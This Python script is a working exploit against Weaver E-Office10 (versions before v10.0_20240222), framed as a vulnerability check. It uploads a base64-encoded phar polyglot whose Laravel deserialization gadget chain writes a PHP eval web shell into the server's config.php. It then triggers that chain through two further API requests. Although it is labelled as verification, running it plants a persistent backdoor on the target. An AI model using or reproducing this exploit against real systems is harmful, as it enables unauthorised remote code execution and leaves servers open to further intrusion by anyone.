import requests
import urllib3
import base64
import json


def verify(url):
    relsult = {
        'name': '泛微E-Office10版本小于v10.0_20240222 atuh-file存在远程代码执行漏洞',
        'vulnerable': False,
        'url': url
    }
    try:
        urls = url + '/eoffice10/server/public/api/attachment/atuh-file'
        hearder = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36'}
        file = base64.b64decode(
            "R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQpSAQAAAQAAABEAAAABAAAAAAAcAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6NTE6ImVjaG8gXjw/cGhwIGV2YWwoJF9QT1NUWzFdKTs/Xj4gPiAuLi93d3cvY29uZmlnLnBocCI7fX0IAAAAdGVzdC50eHQEAAAAXcwLZgQAAAAMfn/YtgEAAAAAAAB0ZXN0r2B11kfQUeYqVgXThGL/oWPzcSMCAAAAR0JNQg==")
        upload_file = {"Filedata": ("register.inc", file, "image/jpeg")}
        urllib3.disable_warnings()
        response = requests.post(url=urls, files=upload_file, headers=hearder)
        response_text = response.text
        attachment_id = json.loads(response_text)['data']['attachment_id']

        urls = url + '/eoffice10/server/public/api/attachment/path/migrate'
        headerss = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip'
        }
        data1 = 'source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F'
        urllib3.disable_warnings()
        response = requests.post(url=urls, headers=headerss, data=data1, verify=False)

        urls = url + '/eoffice10/server/public/api/empower/import'
        headersss = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip'
        }
        urllib3.disable_warnings()
        data2 = 'type=tttt&file=' + attachment_id
        response = requests.post(url=urls, verify=False, headers=headersss, data=data2)
        response_text = response.text
        if "no_file" in response_text:
            print("写入成功")
            relsult['vulnerable'] = True
            relsult['verify'] = url
            return relsult
    except:
        return relsult